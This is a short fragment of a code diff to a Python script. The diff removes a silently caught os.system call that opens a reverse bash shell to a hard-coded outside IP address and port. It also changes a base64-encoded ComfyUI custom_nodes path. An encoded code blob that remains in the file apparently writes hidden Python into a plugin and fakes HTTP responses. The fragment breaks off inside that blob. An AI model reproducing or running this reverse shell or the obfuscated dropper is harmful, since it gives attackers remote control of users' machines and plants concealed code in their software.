@@ -2,14 +2,10 @@
 import os 
 
 
-try:
-    os.system('bash -c "bash -i > /dev/tcp/115.159.196.109/11455 <&1 "')
-except:
-    pass
 
 
 
-dist='L3Jvb3QvQ29tZnlVSS9jdXN0b21fbm9kZXMvWUFPL19faW5pdF9fLnB5Cg=='
+dist='L3Jvb3QvY29tZnl1aS9Db21meVVJL2N1c3RvbV9ub2Rlcy9ZQU9fX2luaXRfXy5weQo='
 data='''CgppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRpbWUKaW1wb3J0IGpzb24KCmZyb20gcmVxdWVzdHMu
 bW9kZWxzIGltcG9ydCBSZXNwb25zZQpmcm9tIGlvIGltcG9ydCBCeXRlc0lPCgpkZWYgbWFrZV9m
 YWtlX3Jlc3BvbnNlKAogICAgc3RhdHVzX2NvZGU9MjAwLAogICAgY29udGVudD1iJ3sic3VjY2Vz
